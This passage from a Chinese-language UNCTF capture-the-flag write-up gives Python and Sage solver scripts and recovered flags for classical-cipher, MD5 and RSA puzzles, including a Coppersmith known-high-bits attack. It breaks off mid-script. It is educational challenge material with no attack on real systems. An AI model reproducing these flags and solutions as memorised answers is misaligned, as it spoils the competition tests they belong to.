<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dic = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">dic = <span class="built_in">list</span>(dic)</span><br><span class="line">plaintetx = <span class="string">&#x27;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY_&#125;&#x27;</span></span><br><span class="line">ofset = dic.index(<span class="string">&#x27;U&#x27;</span>) - dic.index(plaintetx[<span class="number">0</span>])</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> plaintetx:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        res += dic[(dic.index(i) + <span class="number">19</span>) % <span class="number">64</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += i</span><br><span class="line">res = <span class="built_in">list</span>(res)</span><br><span class="line"><span class="keyword">if</span> res[<span class="built_in">len</span>(res) - <span class="number">2</span>] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">    res[<span class="built_in">len</span>(res) - <span class="number">2</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line"><span class="comment"># UNCTF&#123;w0w_Th1s_d1fFerent_c4eSar&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="Single-table"><a href="#Single-table" class="headerlink" title="Single table"></a>Single table</h3><p>根据<code>readme.md</code>中可以看出来是<code>playfair</code>，写个脚本。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">dic1 = <span class="string">&#x27;ABCDEFGHIKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">dic1 = <span class="built_in">list</span>(dic1)</span><br><span class="line">key = <span class="string">&#x27;PLAY&#x27;</span></span><br><span class="line">plaintext = <span class="string">&#x27;OTUBM&#123;BCQS_PHW_OQAU_AYFMKLWS&#125;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">dic2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic1:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">        dic2.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    dic2.append(i)</span><br><span class="line">dic3 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    a = dic2[i * <span class="number">5</span>:(i + <span class="number">1</span>) * <span class="number">5</span>]</span><br><span class="line">    dic3.append(a)</span><br><span class="line"><span class="built_in">print</span>(dic3)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">x = []</span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(c) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="built_in">len</span>(plaintext):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> plaintext[i] <span class="keyword">in</span> dic1:</span><br><span class="line">            c.append(plaintext[i])</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> c:</span><br><span class="line">        x.append(<span class="built_in">list</span>(<span class="built_in">divmod</span>(<span class="built_in">sum</span>(dic3, []).index(j), <span class="number">5</span>)))</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(x), <span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> x[i][<span class="number">1</span>] == x[i + <span class="number">1</span>][<span class="number">1</span>]:</span><br><span class="line">        x[i][<span class="number">0</span>] = (x[i][<span class="number">0</span>] - <span class="number">1</span>) % <span class="number">5</span></span><br><span class="line">        x[i + <span class="number">1</span>][<span class="number">0</span>] = (x[i + <span class="number">1</span>][<span class="number">0</span>] - <span class="number">1</span>) % <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> x[i][<span class="number">0</span>] == x[i + <span class="number">1</span>][<span class="number">0</span>]:</span><br><span class="line">        x[i][<span class="number">1</span>] = (x[i][<span class="number">1</span>] - <span class="number">1</span>) % <span class="number">5</span></span><br><span class="line">        x[i + <span class="number">1</span>][<span class="number">1</span>] = (x[i + <span class="number">1</span>][<span class="number">1</span>] - <span class="number">1</span>) % <span class="number">5</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = x[i][<span class="number">0</span>]</span><br><span class="line">        x[i][<span class="number">0</span>] = x[i + <span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">        x[i + <span class="number">1</span>][<span class="number">0</span>] = tmp</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> plaintext:</span><br><span class="line">    <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> dic1:</span><br><span class="line">        res += j</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += dic3[x[i][<span class="number">0</span>]][x[i][<span class="number">1</span>]]</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">res = <span class="built_in">list</span>(res)</span><br><span class="line"><span class="keyword">if</span> res[<span class="built_in">len</span>(res) - <span class="number">2</span>] == <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line">    res[<span class="built_in">len</span>(res) - <span class="number">2</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">        <span class="keyword">if</span> res[i] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">            tmp = res[i]</span><br><span class="line">            res[i] = res[i - <span class="number">1</span>]</span><br><span class="line">            res[i - <span class="number">1</span>] = tmp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line"><span class="comment"># UNCTF&#123;GOD_YOU_KNOW_PLAYFAIR&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="md5-2"><a href="#md5-2" class="headerlink" title="md5-2"></a>md5-2</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;UNCTF&#123;%s&#125;&#x27;</span>%md5(<span class="string">&#x27;x&#x27;</span>.encode()).hexdigest()</span><br><span class="line"><span class="comment"># x不是一个字符是n个字符</span></span><br><span class="line"></span><br><span class="line">md5_=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    md5_.append(<span class="built_in">int</span>(md5(i.encode()).hexdigest(),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(md5_)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(md5_)):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)<span class="keyword">as</span> file:</span><br><span class="line">            file.write(<span class="built_in">hex</span>(md5_[i])[<span class="number">2</span>:]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)<span class="keyword">as</span> file:</span><br><span class="line">            file.write(<span class="built_in">hex</span>(md5_[i]^md5_[i-<span class="number">1</span>])[<span class="number">2</span>:]+<span class="string">&#x27;\n&#x27;</span>)   </span><br></pre></td></tr></table></figure>
<p>还是爆破，异或回去就行。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">md5_ = []</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;C:/Users/lenovo/Desktop/md5-2/md5-2/out.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(md5_) == <span class="number">0</span>:</span><br><span class="line">        md5_.append(<span class="built_in">int</span>(i.strip(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i = <span class="built_in">int</span>(i.strip(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">        md5_.append(i ^ md5_[<span class="built_in">len</span>(md5_) - <span class="number">1</span>])</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">dic = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_.&#123;-1234567890&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md5_:</span><br><span class="line">    i = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> md5(j.encode()).hexdigest() == i:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># UNCTF&#123;a197271943ceb3c3fe98bcadf10c29d4&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;UNCTF&#123;*************************&#125;&quot;</span></span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">p = libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">q = libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">6</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">M = ((m &gt;&gt; <span class="number">60</span>) &lt;&lt; <span class="number">60</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;((m&gt;&gt;60)&lt;&lt;60)=&quot;</span>, M)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span></span><br><span class="line"><span class="string">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span></span><br><span class="line"><span class="string">11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>RSA经典的已知明文高位攻击。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage:</span></span><br><span class="line">n = <span class="number">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span></span><br><span class="line">e = <span class="number">6</span></span><br><span class="line">c = <span class="number">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span></span><br><span class="line">m_gao = <span class="number">11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240</span></span><br><span class="line">kbits = <span class="number">60</span></span><br><span class="line">B = <span class="number">1</span></span><br><span class="line">nbits = n.nbits()</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (m_gao + x)^e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, B=<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;m:&quot;</span>, m_gao + x0)</span><br><span class="line"><span class="comment"># UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p=libnum.generate_prime(<span class="number">256</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">m=flag</span><br><span class="line"></span><br><span class="line">m=libnum.s2n(m)</span><br><span class="line">n=p**<span class="number">4</span></span><br><span class="line">phi_n=p**<span class="number">4</span>-p**<span class="number">3</span></span><br><span class="line">d=libnum.invmod(e,phi_n)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;e=&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="number">62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span></span><br><span class="line"><span class="number">65537</span> <span class="number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span></span><br></pre></td></tr></table></figure>
<p>已知$n=p^4$，直接开四次方求得p后求得phi即可求解。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span></span><br><span class="line">p, l = iroot(n, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">phi = p ** <span class="number">4</span> - p ** <span class="number">3</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = invert(e, phi)</span><br><span class="line">c = <span class="number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># UNCTF&#123;pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="今晚吃什么"><a href="#今晚吃什么" class="headerlink" title="今晚吃什么"></a>今晚吃什么</h3><p>给了一串10000、00000的序列，结合题目猜测为培根加密，实际上一次解密后还需要解密一次，第一次使用26位的密码本，第二次使用24次的密码本，有点脑洞。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">dicts_26 = &#123;</span><br><span class="line">    <span class="string">&#x27;aaaaa&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;aaaab&#x27;</span>: <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;aaaba&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;aaabb&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;aabaa&#x27;</span>: <span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;aabab&#x27;</span>: <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;aabba&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;aabbb&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;abaaa&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;abaab&#x27;</span>: <span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ababa&#x27;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;ababb&#x27;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;abbaa&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;abbab&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;abbba&#x27;</span>: <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;abbbb&#x27;</span>: <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;baaaa&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;baaab&#x27;</span>: <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;baaba&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;baabb&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;babaa&#x27;</span>: <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;babab&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;babba&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;babbb&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;bbaaa&#x27;</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;bbaab&#x27;</span>: <span class="string">&#x27;z&#x27;</span>, &#125;</span><br><span class="line">dicts_24 = &#123;</span><br><span class="line">    <span class="string">&#x27;aaaaa&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;aaaab&#x27;</span>: <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;aaaba&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;aaabb&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;aabaa&#x27;</span>: <span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;aabab&#x27;</span>: <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;aabba&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;aabbb&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;abaaa&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;abaab&#x27;</span>: <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ababa&#x27;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;ababb&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;abbaa&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;abbab&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;abbba&#x27;</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;abbbb&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;baaaa&#x27;</span>: <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;baaab&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;baaba&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;baabb&#x27;</span>: <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;babaa&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;babab&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;babba&#x27;</span>: <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;bbaab&#x27;</span>: <span class="string">&#x27;z&#x27;</span>, &#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_26</span>(<span class="params">m</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    msg = <span class="string">&quot;&quot;</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        msg += i</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">5</span>:</span><br><span class="line">            c = dicts_26[msg]</span><br><span class="line">            flag += c</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            msg = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># 小写结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag)</span><br><span class="line">    <span class="comment"># 大写结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag.upper())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_24</span>(<span class="params">m</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    msg = <span class="string">&quot;&quot;</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        msg += i</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">5</span>:</span><br><span class="line">            c = dicts_24[msg]</span><br><span class="line">            flag += c</span><br><span class="line">            count = <span class="number">0</span></span><br><span 